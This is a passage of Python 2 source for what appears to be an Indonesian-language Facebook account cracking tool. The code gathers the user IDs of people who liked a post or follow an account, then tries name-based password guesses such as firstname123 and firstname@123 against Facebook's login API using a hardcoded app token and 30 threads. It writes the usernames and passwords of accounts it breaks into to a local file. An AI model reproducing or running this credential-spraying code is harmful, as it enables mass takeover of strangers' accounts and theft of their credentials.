                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Kumar123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Telah Selesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo20
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '        \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK POSTINGAN GRUP/TEMAN\x1b[1;96m \xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        tez = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Postingan Grup/Teman \x1b[1;91m :\x1b[1;92m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mMengambil ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID Posting Salah !'
        raw_input('\n\x1b[1;96m[<\x1b[1;97mKeluar>\x1b[1;96m]')
        menu()

    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mStop Tekan CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mCrack Starting ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mJika Crack Masih Lama'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mHidupkan Mode Peswat 5 Detik'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Simpan 7/10 Hari'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '@123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '007'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '123456789'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Telah Selesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    print logo14
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '              \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK FOLLOWERS \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik / teman tidak ada !'
        raw_input('\n\x1b[1;95m[\x1b[1;97m<Keluar>\x1b[1;95m]')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID Followers \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Tekan CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCrack Starting ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mJika Crack Masih Lama'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mHidupkan Mode Peswat 5 Detik'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Simpan 7/10 Hari'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
